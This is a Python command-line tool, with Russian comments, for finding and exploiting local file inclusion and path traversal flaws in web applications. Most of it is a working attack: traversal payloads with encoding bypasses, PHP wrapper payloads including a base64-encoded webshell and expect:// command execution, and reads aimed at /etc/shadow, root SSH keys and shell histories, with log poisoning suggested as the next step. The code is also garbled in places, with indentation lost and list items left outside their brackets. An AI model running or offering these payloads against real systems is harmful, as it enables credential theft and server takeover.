#!/usr/bin/env python3
import requests
import argparse
import re
import base64
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── Целевые файлы
─────────────────────────────────────────────────────────────
LINUX_FILES = [
("/etc/passwd",
 "root:"),
("/etc/shadow",
 "root:"),
("/etc/hosts",
 "127.0.0.1"),
("/etc/hostname",
 None),
("/proc/self/environ", "PATH="),
("/proc/self/cmdline", None),
("/var/log/apache2/access.log", "GET"),
("/var/log/nginx/access.log", "GET"),
("/etc/nginx/nginx.conf",
 "server"),
("/etc/apache2/apache2.conf", "ServerName"),
("/root/.ssh/id_rsa", "PRIVATE KEY"),
("/root/.bash_history", None),
("/home/www-data/.bash_history", None),
]
WINDOWS_FILES = [
("C:/Windows/System32/drivers/etc/hosts", "127.0.0.1"),
("C:/Windows/win.ini",
 "[fonts]"),
("C:/inetpub/wwwroot/web.config", "configuration"),
("C:/xampp/apache/conf/httpd.conf", "ServerRoot"),
]
# ── Traversal техники
──────────────────────────────────────────────────────────
TRAVERSALS = [
"../",
"..\\",
"....//",
 # Двойной слеш — если фильтр убирает ../
"....\\\\",
"%2e%2e%2f",
 # URL-encoded: ../
"%2e%2e/",
"..%2f",
"%2e%2e\\",
"..%5c",
 # %5c = \
]
"%252e%252e%252f", # Двойное URL-кодирование: ..%2f
"..%c0%af",
 # UTF-8 overlong encoding /
"..%c1%9c",
 # UTF-8 overlong encoding \
"....\/",
"..;/",
 # Tomcat bypass: ;/ игнорируется в пути
PHP_WRAPPERS = [
("php://filter/convert.base64-encode/resource={file}", "base64"),
("php://filter/read=string.rot13/resource={file}", "rot13"),
("php://input",
 "code"),
("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
"rce"),
("expect://id",
 "rce"),
("zip://{file}%23shell",
 "zip"),
("phar://{file}/test.txt",
 "phar"),
]
HEADERS = {"User-Agent": "Mozilla/5.0"}
def build_payloads(target_file: str, depth: int = 8) -> list[str]:
"""Генерирует все комбинации traversal техник для файла."""
payloads = []
# Стандартные traversal'ы с разной глубиной
for traversal in TRAVERSALS:
for d in range(1, depth + 1):
prefix = traversal * d
payloads.append(f"{prefix}{target_file}")
payloads.append(f"{prefix}{target_file.lstrip('/')}")
# Null byte (устарело, но иногда работает на PHP < 5.3)
payloads.append(f"../../../etc/passwd%00")
payloads.append(f"../../../etc/passwd\x00.jpg")
# PHP wrappers
for wrapper_template, _ in PHP_WRAPPERS:
if "{file}" in wrapper_template:
payloads.append(wrapper_template.format(file=target_file))
else:
payloads.append(wrapper_template)
return payloads
def send_request(session: requests.Session, url: str, method: str,
param: str, payload: str) -> tuple[int, str]:
"""Отправляет запрос с LFI payload'ом."""
try:
if method == "GET":
parsed = urlparse(url)
params = parse_qs(parsed.query, keep_blank_values=True)
params = {k: v[0] for k, v in params.items()}
params[param] = payload
test_url = urlunparse(parsed._replace(query=urlencode(params)))
resp = session.get(test_url, timeout=5, verify=False)
else:
resp = session.post(url, data={param: payload},
timeout=5, verify=False)
return (resp.status_code, resp.text)
except Exception:
return (0, "")
def check_lfi(body: str, indicator: str | None) -> bool:
"""Проверяет наличие признаков успешного LFI в ответе."""
if indicator and indicator in body:
return True
# Общие признаки
unix_indicators = ["root:x:", "root:!", "/bin/bash", "/bin/sh",
"daemon:", "nobody:", "PATH=", "DOCUMENT_ROOT"]
win_indicators = ["[fonts]", "[extensions]", "Windows", "System32"]
for ind in unix_indicators + win_indicators:
if ind in body:
return True
return False
def decode_php_filter(body: str) -> str:
"""Декодирует base64 из php://filter ответа."""
# Ищем base64 блок в ответе
m = re.search(r'([A-Za-z0-9+/]{20,}={0,2})', body)
if m:
try:
decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
return decoded[:500]
except Exception:
pass
return body[:200]
def main():
parser = argparse.ArgumentParser(description="LFI / Path Traversal Tester")
parser.add_argument("-u", "--url", required=True, help="Целевой URL")
parser.add_argument("-p", "--param", required=True, help="Уязвимый
параметр")
parser.add_argument("-m", "--method", default="GET", choices=["GET",
"POST"])
parser.add_argument("--os",
 default="linux", choices=["linux", "windows"],
help="ОС цели")
parser.add_argument("--depth",
 type=int, default=6,
help="Максимальная глубина traversal (../../..)")
args = parser.parse_args()
session = requests.Session()
session.headers.update(HEADERS)
target_files = LINUX_FILES if args.os == "linux" else WINDOWS_FILES
print(f"{CYAN}[*] LFI Traverser → {args.url}{RESET}")
print(f"{CYAN}[*] Параметр: {args.param} | ОС: {args.os}{RESET}")
print("-" * 60)
findings = []
for target_file, indicator in target_files:
payloads = build_payloads(target_file, args.depth)
found = False
print(f"\n{YELLOW}[*] Тестируем: {target_file} ({len(payloads)}
payloads){RESET}")
for payload in payloads:
status, body = send_request(session, args.url,
args.method, args.param, payload)
if status == 200 and check_lfi(body, indicator):
print(f" {GREEN}[LFI FOUND] Payload: {payload[:60]}{RESET}")
# Если php://filter — декодируем base64
if "base64-encode" in payload:
decoded = decode_php_filter(body)
print(f" {GREEN}PHP Source: {decoded[:200]}{RESET}")
else:
print(f" Содержимое: {body[:200].replace(chr(10), ' ')}")
findings.append({
"file": target_file, "payload": payload,
"content": body[:300]
})
found = True
break
if not found:
print(f" {RED}[-] Не удалось прочитать{RESET}")
print(f"\n{'='*60}")
if findings:
print(f"{GREEN}[✓] LFI подтверждён! Прочитано файлов:
{len(findings)}{RESET}")
print(f"{YELLOW}[!] Следующий шаг: RCE через Log Poisoning (если читаем
логи){RESET}")
else:
print(f"{RED}[-] LFI не обнаружена{RESET}")
if __name__ == "__main__":
main()
